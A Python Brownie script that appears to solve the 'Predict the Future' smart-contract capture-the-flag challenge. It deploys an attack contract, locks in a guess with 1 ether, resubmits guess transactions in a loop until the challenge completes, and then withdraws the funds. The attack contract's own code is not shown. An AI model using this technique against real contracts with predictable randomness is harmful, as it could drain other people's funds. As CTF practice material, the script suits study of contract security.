import sys
from dotenv import dotenv_values
PROJECT_SCRIPTS_PATH = dotenv_values(".env")["CTF_PROJECT_PATH"] + "/scripts/"
PROJECT_BUILD_PATH = dotenv_values(".env")["CTF_PROJECT_PATH"] + "/build/"
sys.path.insert(1, PROJECT_SCRIPTS_PATH)
from helpful_scripts import get_account, padHexTo32Bytes
from brownie import Contract, AttackNewNumberFuture
from web3 import Web3
import json
PUBLIC_KEY = dotenv_values(".env")["PUBLIC_KEY"]


def main():
    ###########
    # SETUP
    ###########
    with open(PROJECT_BUILD_PATH + "contracts/PredictTheFutureChallenge.json") as f:
        info_json = json.load(f)
    Challenge_ABI = info_json["abi"]
    with open(PROJECT_BUILD_PATH + "contracts/AttackNewNumberFuture.json") as f:
        info_json = json.load(f)
    # Attack_ABI = info_json["abi"]
    # Attack_Address = "0xeC4EeD8DdFF8d068bB2Bdc166cc6d801f1d2A8b7"
    # attack = Contract.from_abi(name="attack", address=Attack_Address,abi=Attack_ABI)
    Challenge_Address = "0xcafA13991E41aC010caBe07468069dD5e97e74A0"
    challengeContract = Contract.from_abi(name="", address=Challenge_Address,abi=Challenge_ABI)
    account = get_account()

    ###########
    # SOLVING
    ###########
    attack = AttackNewNumberFuture.deploy({"from": account})
    lock_tx = attack.lockItIn(Challenge_Address, {"from": account, "value": Web3.toWei(1, 'ether')})
    lock_tx.wait(2)

    while(not challengeContract.isComplete()):
        attack_tx = attack.guess(Challenge_Address, {"from": account, "gas_limit": 100_000})
        attack_tx.wait(1)

    ###########
    # CHECKING
    ###########
    isComplete = challengeContract.isComplete()
    print(isComplete)
    attack.withdraw({"from": account})

    print('Finished')

if __name__ == "__main__":
    main()